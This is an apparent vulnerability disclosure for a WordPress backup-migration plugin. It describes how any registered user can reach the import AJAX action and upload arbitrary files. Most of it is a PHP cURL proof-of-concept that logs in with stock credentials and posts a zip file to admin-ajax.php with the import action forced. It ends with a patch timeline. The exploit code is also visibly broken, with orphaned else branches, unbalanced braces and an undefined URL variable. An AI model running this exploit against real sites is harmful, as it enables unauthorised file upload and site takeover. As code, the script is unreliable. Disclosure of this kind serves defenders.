
Function is imported as action: add_action(‘wp_ajax_import’, ‘Ai1wm_Import_Controller::import’) in class-ai1wm-main-controller.php

It’s possible to use it through wp-admin/admin-ajax.php as regular user.

Using this functionality, we can send any kind of files to remote server.
Proof of Concept:

function hack($login, $pass, $url, $cookie ){

    $ckfile = dirname(__FILE__) . $cookie;
    $cookie = fopen($ckfile, &#039;w&#039;) or die("Cannot create cookie file");

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url.&#039;wp-login.php&#039;);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_REFERER, $url.&#039;wp-login.php&#039;);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "log=".$login."&pwd=".$pass."&wp-submit=Log%20In");
	curl_setopt($ch, CURLOPT_POST, 1);
	$content = curl_exec($ch);

        echo &#039;We are log in.<br />&#039;;
        curl_setopt($ch, CURLOPT_URL, $url.&#039;wp-admin/admin-ajax.php&#039;);
        curl_setopt($ch,
            CURLOPT_POSTFIELDS,
            array(
                &#039;upload-file&#039; => &#039;@&#039; . realpath(&#039;poc.zip&#039;),
                &#039;action&#039; => &#039;import&#039;,
                &#039;force&#039; => &#039;1&#039;,
                &#039;name&#039; => &#039;poc&#039;
            ));
        $content = curl_exec($ch);

            echo &#039;Success&#039;;
        } else {
            echo &#039;Cannot exploit site&#039;;
        }
    } else {
    }

	curl_close( $ch );
}


// Standard user credentials (created using wp-login.php?action=register)
$user = "test";
$pass = "test";
$cookie = "/cookie.txt";

hack($user, $pass, $url, $cookie);

Timeline:

    13-10-2014: Discovered
    14-10-2014: Vendor notified
    15-10-2014: Version 2.0.3 released, issue resolved

